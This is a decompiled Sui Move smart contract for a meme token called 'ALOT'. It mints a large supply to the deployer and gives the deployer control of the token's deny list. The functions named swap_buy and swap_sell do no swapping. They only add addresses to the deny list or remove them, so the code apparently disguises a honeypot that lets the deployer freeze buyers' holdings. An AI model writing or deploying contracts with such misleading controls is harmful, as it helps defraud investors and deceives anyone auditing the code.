module 0x7eabab4931800abcb9eed191b4f45e85fa9c3baee081d5c63743545cf5792f9e::alot {
    struct ALOT has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: ALOT, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<ALOT>(arg0, 9, b"alot", b"this will be worth alot", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmQeWaj1QLhKMkfYbS8ck9MUD1RQyd8KzS7zWSSj9B9nzM"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<ALOT>(&mut v3, 420690000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<ALOT>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<ALOT>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<ALOT>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<ALOT>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<ALOT>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<ALOT>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<ALOT>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

